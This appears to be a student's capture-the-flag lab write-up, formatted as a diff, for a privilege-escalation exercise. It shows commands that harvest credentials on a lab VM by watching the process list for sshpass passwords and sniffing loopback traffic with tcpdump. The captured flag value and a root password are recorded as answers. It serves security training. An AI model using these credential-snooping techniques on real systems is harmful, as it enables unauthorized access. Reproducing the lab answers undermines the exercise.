@@ -1,0 +1,20 @@
+Questions 2
+Connect to VM 2 as the joe user and retrieve the flag using one of the methods explained in this section.
+
+HINT
+Take a look at the list of running processes on the system. Use the provided command in Listing 6 - Manual Enumeration learning unit on how to use the 'ps' command to display the running processes and their associated details
+
+
+ssh joe@192.168.214.214
+watch -n 1"ps -aux | grep pass"
+...
+root      1608  0.0  0.0   2384   760 ?        S    00:02   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
+root      1609  0.0  0.0   2356  1632 ?        S    00:02   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
+...
+
+sudo tcpdump -i lo -A | grep "pass"
+...
+.}...}..user:flag,pass:OS{a26d5d82a608c2f2b6edb146e018ec80} -
+.}...}..user:root,pass:lab -
+.}...}..user:flag,pass:OS{a26d5d82a608c2f2b6edb146e018ec80} -
+...
